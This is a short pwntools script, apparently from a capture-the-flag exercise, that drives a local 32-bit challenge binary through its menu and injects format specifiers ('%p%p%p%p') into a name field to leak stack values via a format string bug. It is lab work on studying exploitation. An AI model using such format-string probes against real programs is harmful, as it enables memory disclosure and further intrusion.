#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.bits = 32

r = process('./image/challenge/challenge')

# Enviar nombre inicial - read() lee hasta 31 bytes
r.send(b'test\n')

# Esperar el menú
r.recvuntil(b'Menu:')

# Opción 1: Edit name
r.sendline(b'1')
r.recvuntil(b'Name: ')
# Escribir format specifiers
r.send(b'%p%p%p%p\n')

# Opción 2: Prep msg
r.sendline(b'2')

# Opción 3: Print msg
r.sendline(b'3')

# Leer salida
output = r.recvuntil(b'Menu:', timeout=2)
print("Output:", output.decode('utf-8', errors='ignore'))

r.interactive()
